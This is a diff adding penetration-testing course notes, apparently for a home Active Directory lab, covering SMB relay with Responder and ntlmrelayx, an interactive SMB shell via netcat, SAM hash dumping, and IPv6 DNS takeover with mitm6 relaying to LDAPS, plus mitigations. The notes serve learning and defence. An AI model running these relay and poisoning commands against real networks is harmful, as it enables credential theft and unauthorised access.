@@ -118,6 +118,134 @@ Host scipr results:
 
 ## SMB Relay Attack Demonstration
 
+After making necessary changes to Responder.conf...
+
+### Run Responder
+
+```bash
+kali@kali:~/ctf/tcm/peh$ sudo responder -I eth0 -rdw
+...
+[+] Listening for events...
+```
+
+### Run ntlmrelayx
+
+```bash
+kali@kali:~/ctf/tcm/peh$ ntlmrelayx.py -tf targets.txt -smb2support
+...
+[*] Servers started, waiting for connections
+```
+
+### Trigger Connection
+
+#### From Target
+
+Type `\\ATTACKER-IP` in File Explorer
+
+#### From Kali
+
+Hashes returned as well as a dumping of local SAM hashes
+
+### Getting a Shell
+
+Instead of running ntlmrelayx like before, the `-i` option to try and get an interactive shell
+
+```bash
+kali@kali:~/ctf/tcm/peh$ ntlmrelayx.py -tf targets.txt -smb2support -i
+...
+[*] Servers started, waiting for connections
+```
+
+Run the same action from Trigger Connection section
+
+In the output it will say where the shell was returned i.e. 127.0.0.1:11000
+
+Use netcat to connection to this port
+
+```bash
+kali@kali:~/ctf/tcm/peh$ nc 127.0.0.1 11000
+# help
+We are in an SMB shell essentially
+# shares
+# use C$
+```
+
 ## SMB Relay Attack Defenses
 
+### Mitigation
+
+* Enable SMB Signing on all devices
+  * Pro: Completely stops the attack
+  * Con: Can cause performance issues with file copies
+* Disable NTLM authentication on network
+  * Pro: Completely stops the attack
+  * Con: If Kerberos stops working, Windows defaults back to NTLM
+* Account Tiering:
+  * Pro: Limits domain admins to specific tasks
+  * Con: Enforcing the policy may be difficult
+* Local Admin Restriction:
+  * Pro: Can prevent a lot of lateral movement
+  * Con: Potential increase in the amount of service desk tickets
+
 ## Gaining Shell Access
+
+Metasploit Walkthrough
+
+Also Metasploit psexec vs psexec.py, wmiexec.py, smbexec.py
+
+## IPv6 Attacks Overview
+
+## Installing mitm6
+
+{% embed url="https://github.com/dirkjanm/mitm6" %}
+
+## Setting Up LDAPS
+
+Walkthrough of setting up LDAPS server on the Windows Server&#x20;
+
+## IPv6 DNS Takeover via mitm6
+
+#### Run mitm6
+
+```bash
+kali@kali:~/ctf/tcm/peh$ mitm6 -d marvel.local
+```
+
+#### Run ntlmrelayx
+
+```bash
+kali@kali:~/ctf/tcm/peh$ ntlmrelayx.py -6 -t ldaps//<LDAPS-IP> -wh fakewpad.marvel.local -l lootme
+```
+
+{% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6" %}
+
+{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation" %}
+
+## IPv6 Attack Defenses
+
+### Mitigation
+
+1. IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you don't use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
+   1. a...
+   2. b...
+   3. c...
+2. If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
+3. Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
+4. Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.
+
+## Passback Attacks
+
+{% embed url="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack" %}
+
+## Other Attack Vectors and Strategies
+
+### Strategies
+
+* Begin the day with mitm6 or Responder
+* Run scans to generate traffic
+* If scans are taking too long, look for websites in scope (http\_version)
+* Look for default credentials on web logins
+  * Printers
+  * Jenkins
+  * Etc
+* Think outside the box
